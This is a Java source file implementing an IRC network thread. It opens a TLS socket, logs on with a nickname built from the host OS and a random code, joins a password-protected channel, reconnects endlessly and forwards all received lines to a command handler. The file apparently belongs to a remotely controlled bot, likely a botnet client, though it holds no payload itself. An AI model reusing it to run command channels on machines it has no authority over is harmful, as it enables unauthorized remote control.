package syn.threads;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.SocketException;

import javax.net.ssl.SSLSocket;
import javax.net.ssl.SSLSocketFactory;

import syn.main.Client;
import syn.utils.Settings;
import syn.utils.Utilities;

public class NetworkThread implements Runnable {

	private String channel;
	//private Socket socket;
	private SSLSocket socket;
	private BufferedWriter writer;
	private BufferedReader reader;
	private Utilities uc;
	private String line;
	private String nick;

	public NetworkThread(String server, String channel, int port) {
		try {
			this.channel = channel;
			SSLSocketFactory sslsocketfactory = (SSLSocketFactory) SSLSocketFactory.getDefault();
			socket = (SSLSocket) sslsocketfactory.createSocket(server, port);
			//socket = new Socket(server, port);
			writer = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));
			reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
			uc = new Utilities();
			line = null;
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public void run() {
		if(connect()) {
			readLines();
		}
	}

	private boolean connect() {	
		try {
			nick = uc.procOS(Client.getInstance().os) + "-" + uc.genCode();
			String login = "synth";

			// Log on to the server.
			writer.write("NICK " + nick + "\r\n");
			writer.write("USER " + login + " 8 * : Synthetic\r\n");
			writer.flush();

			// Read lines from the server until it tells us we have connected.
			while((line = reader.readLine()) != null) {
				Client.getInstance().cmdThread.setLine(line);
				if(line.contains("004")) {
					// We are now logged in.
					break;
				} else if (line.indexOf("433") >= 0) {
					//Retry connection with diff nick
					return false;
				}
			}

			// Join the channel.
			writer.write("JOIN " + channel + " " + Settings.channelPass + "\r\n");
			writer.flush();
			Client.getInstance().connected = true;
			return true;
		} catch (Exception e) {}
		return false;
	}

	private void readLines() {
		// Keep reading lines from the server.
		try {
			while((line = reader.readLine()) != null) {
				Client.getInstance().cmdThread.setLine(line);
				// Print the raw line received by the bot.
				//TODO: DEBUG 
			}
		} catch (Exception e) {
			//Disconnected, reconnect if it's recv failed
			if(e instanceof SocketException && Client.getInstance().connected) {
				while(true) {
					try {
						Client.getInstance().connected = false;
						connect();
						if(Client.getInstance().connected) {
							break;
						} else {
							Thread.sleep(2000);
						}
					} catch (Exception e1) {
						e1.printStackTrace();
					}
				}
				readLines();
			}
		}
	}

	public void disconnect() {
		try {
			Client.getInstance().dupePrevent.close();
			socket.close();
			System.exit(0);
		} catch (IOException e) {}
	}

	public String getChannel() {
		return channel;
	}

	public BufferedWriter getWriter() {
		return writer;
	}
}
